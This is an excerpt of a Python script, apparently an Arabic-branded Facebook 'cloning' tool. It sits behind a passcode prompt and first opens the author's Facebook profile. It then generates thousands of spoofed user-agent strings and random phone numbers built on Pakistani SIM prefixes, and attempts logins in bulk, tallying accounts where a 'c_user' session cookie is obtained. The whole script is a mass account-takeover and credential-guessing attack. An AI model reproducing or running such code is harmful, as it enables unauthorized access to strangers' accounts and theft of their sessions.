...
import sys
import os
os.system('xdg-open https://www.facebook.com/profile.php?id=61584724276982');
yso = 'هانيبال العرص'
pss=input("\033[1;36mاكـــتــب رمــز ")
if pss ==yso:
 pass
 print("\033[2;35m         ❤️‍🔥✅ رمز صح نورت اداه مزداوي")
 
 os.system('clear')
else:
 exit('\033[93m         🌚❌ الرمز غلط   ')
import os
...
for xd in range(5000):
    aa=' Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0'
    ...
    l=' Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0 '
...
for xd in range(10000):
    a=' Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0 '
    ...
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
...
for t in range(10000):
    ...
    ugen.append(uaku)
for x in range(10):
    a='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36'
...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE , المزداوي, ,  ")
...
def XYZ():
    ...
    clear()
    print('           \x1b[97m[\033[37;41m  M [ A l- M a z d a w i ]  \033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════')
...
def pass1():
    ...
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : {Y}21891, 21892, 21893, 21894')
    print(f' {GREEN}[!]               : {T}0303, 21891, 21892, 21893')
    print(f' {GREEN}[!]               : {Q}0349, 21891, 21892, 21893')
    linex()
...
def pass2():
    ...
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I [ A l- M a z d a w i ]  \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Goker 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
